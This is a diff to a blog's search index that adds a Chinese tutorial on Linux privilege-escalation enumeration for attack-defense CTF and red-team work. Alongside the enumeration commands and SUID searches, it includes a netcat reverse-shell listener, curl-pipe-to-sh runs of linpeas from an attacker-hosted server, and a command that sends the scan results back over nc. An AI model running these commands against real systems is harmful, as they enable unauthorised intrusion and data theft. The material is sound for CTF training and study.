@@ -700,8 +700,8 @@ The little girl was so happy that she had been able ...
         <category>Web</category>
       </categories>
       <tags>
+        <tag>反序列化</tag>
         <tag>pop 链</tag>
-        <tag>PHP反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -872,6 +872,138 @@ The little girl was so happy that she had been able ...
       </categories>
       <tags>
         <tag>神经网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AWD 提权信息枚举</title>
+    <url>/2023/11/11/AWD-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</url>
+    <content><![CDATA[<h1 id="【AWD】Linux-提权-信息枚举"><a href="#【AWD】Linux-提权-信息枚举" class="headerlink" title="【AWD】Linux 提权 - 信息枚举"></a>【AWD】Linux 提权 - 信息枚举</h1><p>大部分攻防场景, 在维持权限获取 shell 后, 很可能会分配到一个低权限用户, 提权到 root 级别的管理员用户才有 getshell 的意义.</p>
+<h2 id="权限体系"><a href="#权限体系" class="headerlink" title="权限体系"></a>权限体系</h2><h3 id="SUID-SGID"><a href="#SUID-SGID" class="headerlink" title="SUID SGID"></a>SUID SGID</h3><p><strong>SUID(Set User ID)</strong> 和 <strong>SGID(Set Group ID)</strong> 统称为 S 位, 被设置在可执行文件上, 当这些位被设置时，文件或程序将以文件所有者或组的权限运行，而不是以运行它的用户的权限运行。</p>
+<ul>
+<li>SUID: 当 SUID 位被设置, 无论谁运行这个文件，该文件都会以<strong>文件所有者</strong>的权限执行, SUID位通常表示为文件权限字符串中的一个s字符，如果权限是可执行的话，否则它是一个大写的S。</li>
+<li>SGID: 当 SGID 位被设置, 该文件会以文件组的权限执行。当SGID设置在目录上时，创建在该目录下的任何新文件都会继承该目录的组ID，而不是继承创建它的用户的主组ID。SGID位在文件权限字符串中也表示为s或S，取决于组权限是否可执行。</li>
+</ul>
+<h3 id="AppArmor-SElinux"><a href="#AppArmor-SElinux" class="headerlink" title="AppArmor SElinux"></a>AppArmor SElinux</h3><ul>
+<li>AppArmor 是一种主要基于路径的强制访问控制（MAC）系统，它允许系统管理员为每个程序定义一个配置文件，来控制程序可以访问的文件和权限。 举个例子, 使用 AppArmor 可以为一个特定的程序指定只能读取特定目录下的文件。</li>
+<li>SELinux 基于策略来控制程序之间以及程序与文件之间的交互。与 AppArmor 不同，SELinux 不仅基于路径，而且使用了一套复杂的标签系统（包括类型、角色、用户等标签），这使得它可以实现更精细化的安全控制。</li>
+</ul>
+<h3 id="不常用的安全机制"><a href="#不常用的安全机制" class="headerlink" title="不常用的安全机制"></a>不常用的安全机制</h3><ul>
+<li><strong>Grsecurity</strong>: 为Linux内核提供各种安全增强和补丁的项目, 功能包括角色基础访问控制 (RBAC), 内存保护,审计等</li>
+<li><strong>Pax</strong>: 基于内核的保护补丁</li>
+<li><strong>ExecShield</strong>: 可执行文件的‘盾’,也是基于内核的安全机制</li>
+<li><strong>ASLR(Address Space Layout Random)</strong>: 地址空间布局随机化</li>
+<li><strong>TOMOYO Linux</strong>: 也是基于 MAC 的内核安全模块, 比AppArmor轻量级</li>
+<li><strong>SMACK (Simplified Mandatory Access Control Kernel)</strong>: SMACK是一个用于Linux的简化的强制访问控制系统。它提供了一种机制，允许系统管理员定义访问控制规则，这些规则指定哪些进程可以访问哪些文件和资源。</li>
+<li><strong>Yama</strong>: Yama是一个Linux内核安全模块，提供了一系列安全策略。它最著名的功能之一是限制ptrace系统调用，这有助于防止某些类型的安全漏洞，特别是针对调试和系统监控工具的攻击。</li>
+<li><strong>CGroups (Control Groups)</strong>: CGroups是Linux内核的一部分，允许对系统资源（如CPU时间、系统内存、网络带宽等）进行分组管理和限制。这有助于实现资源分配、优先级控制等。</li>
+<li><strong>Linux Namespaces</strong>: Linux命名空间是一种提供隔离的技术，它可以将系统的不同部分（如进程、网络、文件系统等）隔离开来，使得在一个命名空间中的进程看不到另一个命名空间中的资源。这是容器技术的关键组成部分。</li>
+<li><strong>StackGuard</strong>: StackGuard是一个编译时安全特性，用于防范栈溢出攻击。它通过在栈上插入特殊的“哨兵”值来工作，这些值在函数调用时检查，以防止栈缓冲区溢出。</li>
+<li><strong>Proplice</strong>: 这可能是对“Polkit”（以前称为PolicyKit）的提及，这是一个用于控制系统范围内特权的框架。它允许非特权进程向特权进程请求执行特定任务。</li>
+<li><strong>seccomp (Secure Computing Mode)</strong>: seccomp是一个Linux内核特性，允许一个进程设定一个“安全模式”，这个模式将限制进程可以调用的系统调用。这有助于限制进程的行为，防止安全漏洞。</li>
+<li><strong>ptrace</strong>: ptrace是一种用于调试和监控Linux进程的系统调用。它允许一个进程观察和控制另一个进程的执行，以及检查和改变其内存和寄存器等。</li>
+<li><strong>Capsicum</strong>: Capsicum是一种轻量级的操作系统能力和沙箱机制，最初是为FreeBSD开发的，但也有Linux实现。它允许应用程序以最小的特权运行。</li>
+<li><strong>Mprotect</strong>: Mprotect是一个系统调用，允许改变一个进程内存区域的保护。这可以用来防止程序的某些部分被修改，或者防止执行非执行内存区域，作为安全措施。</li>
+<li><strong>chroot</strong>: chroot是一种改变进程的根目录的操作。这可以用来创建一个隔离的环境，其中进程不能访问主文件系统之外的文件。</li>
+<li><strong>firejail</strong>: firejail是一个沙箱程序，用于限制应用程序的运行环境。它通过使用Linux命名空间和seccomp-bpf等技术来提供隔离和安全控制。</li>
+</ul>
+<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><ol>
+<li>低权限可以修改可执行文件或者脚本, 然后能够以高权限运行这个文件或者脚本.</li>
+<li>从用户行为的角度, 运维人员的操作习惯, 管理标准, 他们会把敏感信息留下方便他们操作.</li>
+<li>有机会能够在权限体系上层提权, 如内存, cpu 进行操作, 在权限上层捕捉,拦截,修改凭据信息, 如基于内存去读取敏感信息的内核利用.</li>
+</ol>
+<h2 id="权限枚举"><a href="#权限枚举" class="headerlink" title="权限枚举"></a>权限枚举</h2><h3 id="枚举准备"><a href="#枚举准备" class="headerlink" title="枚举准备"></a>枚举准备</h3><p>权限枚举之前, 可以通过以下方式提高终端交互性和稳定性:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">stty raw -<span class="built_in">echo</span></span><br><span class="line">export TERM=xterm-<span class="built_in">color</span></span><br></pre></td></tr></table></figure>
+
+<p>以上命令通过 python 开启一个 bash 会话, 然后让 stty 通过行读取并禁用 echo. 然后可以使用</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp 端口号</span><br></pre></td></tr></table></figure>
+
+<p>在获取反弹 shell 之前, 用 rlwrap 包裹起来, 这样就可以在终端中用方向键翻命令.</p>
+<h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><p>在这里列举的所有命令中, 第一条是主命令,大多情况适用</p>
+<p>查看当前权限</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami # 查看自己的用户</span><br><span class="line">id    # 查看所有用户的权限信息</span><br><span class="line">who   # 当前登录的用户和相关信息, 可以看除了自己以外哪些用户登录了</span><br><span class="line">w     # 当前登录用户的详细信息</span><br><span class="line">last  # 显示系统最近的登录记录</span><br></pre></td></tr></table></figure>
+
+<p>看内核版本</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a #查看当前内核版本</span><br><span class="line">lsb_release -a #查看更详细的信息</span><br><span class="line">cat /proc/version </span><br><span class="line">cat /etc/issue</span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>
+
+<p>查看当前机器的 IP 地址 (横向渗透获取内网信息)</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ip addr  # 最新最通用的方法</span><br><span class="line">ifconfig # 旧机器的查看 ip 方法</span><br><span class="line">ip route # 查看路由表</span><br><span class="line">ip neigh # 查看网络邻居</span><br><span class="line">arp -a   # 局域网中哪些 mac 地址和 ip 地址做了绑定</span><br></pre></td></tr></table></figure>
+
+<p>查看机器名称(用于定位角色来排除数据的优先级)</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hostname # 看这个机器的名字</span><br><span class="line">hostnamectl #更详细一点</span><br></pre></td></tr></table></figure>
+
+<p>看当前用户有哪些以 <code>root</code> 的身份执行的</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>查看权限体系</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null # 用 -r 指定根目录, 错误信息扔掉</span><br></pre></td></tr></table></figure>
+
+<p>查看命令</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -liah # 查看所有文件,包括隐藏文件</span><br><span class="line">ls -a    # 查看全部文件</span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>passwd</code> 文件, 查看用户(名称:密码目录 + 描述 + bash 环境)</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd # 获取用户描述(有 home 目录的就是活跃用户)+对应的 bash 环境</span><br></pre></td></tr></table></figure>
+
+<p>查看自动任务, 具体看是否有 root 权限的自动任务</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p>查看环境变量</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="built_in">PATH</span> # 查看路径</span><br><span class="line">env  # 看整体环境变了</span><br></pre></td></tr></table></figure>
+
+<p>查看进程信息, 展示出来的列中, UID 是用户类型, PID 是进程号,<br>TTY 是终端类型, TIME 是进程使用的 cpu 时间, CMD 是进程正在运行的命令和可执行文件</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps -ef  # 通用</span><br><span class="line">ps axjf # a 查看所有进程, x 没有连接到终端的进程, j 显示进程数, f 输出格式</span><br><span class="line">ps <span class="built_in">aux</span>  # u 显示启动进程的用户</span><br><span class="line">top -n <span class="number">1</span> # top 是定时刷新进程的, 用 -n <span class="number">1</span> 让他只显示一次</span><br></pre></td></tr></table></figure>
+
+<p>查看网络统计, 可以看到占用端口的程序,和他的进程 id</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -a # 查看所有</span><br><span class="line">netstat -au # 列出所有 TCP, UDP 连接的端口</span><br><span class="line">netstat -l # 列出监听的端口</span><br><span class="line">netstat -s # 统计网络使用的情况</span><br><span class="line">netstat -ano # n 不解析名称, o 显示计时器</span><br></pre></td></tr></table></figure>
+
+<p>查看有 S 位的可执行文件, 2&gt;&#x2F;dev&#x2F;null 把报错信息给扔掉</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>查看工具是否有安装</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">which 工具</span><br><span class="line">which awk perl python ruby gcc vi vim nmap <span class="built_in">find</span> nc wget tftp <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>查看哪些磁盘没被挂载, 运维人员做备份或者做系统快照时, 会用一个临时挂载的磁盘存取这些敏感信息.</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
+
+<h3 id="自动化枚举"><a href="#自动化枚举" class="headerlink" title="自动化枚举"></a>自动化枚举</h3><p>先说说缺点:</p>
+<p>自动化枚举往往要搬运工具, 会产生流量和流量特征, 且枚举的消息十分冗长, 要十分熟悉才能找到好的信息, 而且针对性很差.</p>
+<p>这里列举工具,记得在 release 里找到对应系统的支持,再去搬运</p>
+<ol>
+<li>PEASS-ng (主要)</li>
+<li>LinEnum (备选)</li>
+<li>Linux-smart-enumeration (备选)</li>
+<li>Linux-exploit-suggester (备选)</li>
+<li>linuxprivchecker (备选,主要用 python)</li>
+<li>unix-privesc-check (超级备选</li>
+</ol>
+<p>不同系统可能没安装对应的语言, 或者对特定语言的函数做了过滤, 要多换几个工具.</p>
+<p>以 LinPEASS 为例, 以下是操作方法:</p>
+<p>传统方法:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp # 大多数在 tmp 目录下做</span><br><span class="line">wget https:.... # 搬运工具</span><br><span class="line">ls # 查看可执行文件</span><br><span class="line">chmod +x linpeas.sh # 赋予权限</span><br><span class="line">./linpeas.sh # 执行</span><br></pre></td></tr></table></figure>
+
+<p>推荐方法(有 curl):</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -L https:... | sh </span><br></pre></td></tr></table></figure>
+
+<p>这里用 <code>-L</code> 追随重定向, 用 <code>|</code> 管道符连接到 <code>sh</code> 直接执行,就不会再本地存储.</p>
+<p>如果连不到外网, 就要先在自己的机子本地下载 sh 文件, 然后在启动监听, 再 curl 过去靶机.</p>
+<p>本地机 1:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo python3 -m http.server 端口</span><br></pre></td></tr></table></figure>
+
+<p>靶机:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl 本地 ip/linpeas.sh | sh</span><br><span class="line">curl 本地 ip/linpeas.sh | sh | nc #本地监听 ip 本地监听端口 # 将扫描结果回弹到本地</span><br></pre></td></tr></table></figure>
+
+<p>本地机 2:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp 端口号 | tee linpeas.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果靶机执行第二条语句, 本地机 2 就会获得扫描结果文本.</p>
+]]></content>
+      <categories>
+        <category>AWD</category>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>提权</tag>
+        <tag>信息枚举</tag>
       </tags>
   </entry>
 </search>
